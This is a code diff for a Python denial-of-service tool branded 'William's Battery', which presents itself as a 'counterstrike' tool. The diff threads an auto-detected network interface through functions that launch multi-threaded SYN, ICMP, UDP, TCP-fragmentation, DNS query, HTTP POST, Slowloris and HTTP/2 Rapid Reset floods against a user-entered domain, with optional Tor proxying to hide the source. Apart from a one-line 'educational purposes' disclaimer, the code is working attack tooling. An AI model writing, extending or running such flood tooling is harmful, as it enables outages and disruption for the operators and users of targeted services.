@@ -14,7 +14,7 @@ def launch_attack_thread(target_func, args_tuple):
     return thread
 
 
-def full_scale_counter_strike(target, use_proxy):
+def full_scale_counter_strike(target, use_proxy, network_interface):
     """
     Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
     This is a siege designed to run for a long time.
@@ -39,18 +39,18 @@ def full_scale_counter_strike(target, use_proxy):
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
     for port in [80, 443, 22, 3389, 25]:  # SYN
-        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
-    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # ICMP
+    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # ICMP
     attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
     # NEW: TCP Fragmentation Attack on common web ports
     for port in [80, 443]:
-        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
 
     # --- Launch Application Layer Floods (L7) ---
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
-    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
+    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # DNS Query
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
     if use_proxy: print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")
 
@@ -74,7 +74,7 @@ def full_scale_counter_strike(target, use_proxy):
         stop_event.set()
 
 
-def fast_scale_counter_strike(target, use_proxy):
+def fast_scale_counter_strike(target, use_proxy, network_interface):
     """
     Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
     Includes the more effective HTTP POST and H2 Rapid Reset floods.
@@ -91,11 +91,11 @@ def fast_scale_counter_strike(target, use_proxy):
     print(f"[CONFIG] Surgical mode: Using {params['threads']} flood threads and {params['h2_threads']} H2 connections.")
 
     # Launch focused attacks
-    args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
+    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # DNS Query
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
     for port in [80, 443, 22]:  # SYN
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, (
-        target, port, params["duration"], stop_event, pause_event, params["threads"])))
+        target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)))
     for port in [80, 443]:  # HTTP POST
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, (
         target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)))
@@ -113,7 +113,7 @@ def fast_scale_counter_strike(target, use_proxy):
         stop_event.set()
 
 
-def adaptive_strike(target, use_proxy):
+def adaptive_strike(target, use_proxy, network_interface):
     """Launches a 'Fast Scale' profile managed by an adaptive controller."""
     print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
     try:
@@ -131,8 +131,8 @@ def adaptive_strike(target, use_proxy):
 
     # Define the attack profile, now including H2 Rapid Reset
     attack_profile = [
-        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads)),
-        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads, network_interface)),
+        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads, network_interface)),
         (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads, use_proxy)),
         # NEW: HTTP/2 Rapid Reset
         (counter_strike_helper.attack_h2_rapid_reset,
@@ -156,13 +156,20 @@ def adaptive_strike(target, use_proxy):
         time.sleep(2)
 
 
-# --- Main Execution Block with Updated Descriptions ---
+# --- Main Execution Block with Auto-Detection ---
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
+
+    # --- NEW: Auto-detect the network interface ---
+    NETWORK_INTERFACE = counter_strike_helper.auto_detect_interface()
+    if not NETWORK_INTERFACE:
+        print("[ERROR] Failed to identify network interface. Scapy attacks may fail.")
+        print("[INFO] You may need to manually specify the interface in the code if attacks are not working.")
+        # The script will continue, but the user is warned.
+
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
     target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
 
-    # NEW: Ask user if they want to enable the SOCKS proxy (Tor)
     proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
     proxy_enabled = True if proxy_choice == 'y' else False
     if proxy_enabled:
@@ -171,21 +178,22 @@ if __name__ == "__main__":
 
     try:
         options_text = """
-    Select an Attack Profile:
-      1: Full Scale Counterstrike (Max-power siege with all vectors)
-      2: Fast Counterstrike (Short, intense burst with modern vectors)
-      3: Adaptive Counterstrike (Smart, responsive attack)
+Select an Attack Profile:
+  1: Full Scale Counterstrike (Max-power siege with all vectors)
+  2: Fast Counterstrike (Short, intense burst with modern vectors)
+  3: Adaptive Counterstrike (Smart, responsive attack)
 
-    Please enter your option: """
+Please enter your option: """
         options = int(input(options_text))
 
-        # Pass the proxy_enabled flag to the chosen profile function
+        # Pass both the proxy flag and the detected interface to the functions
         if options == 1:
-            full_scale_counter_strike(target_domain, proxy_enabled)
+            full_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
         elif options == 2:
-            fast_scale_counter_strike(target_domain, proxy_enabled)
+            fast_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
         elif options == 3:
-            adaptive_strike(target_domain, proxy_enabled)
+            # The adaptive strike will also need to be updated to accept and pass on the interface
+            adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
         else:
             print("Invalid option selected. Exiting.")
 
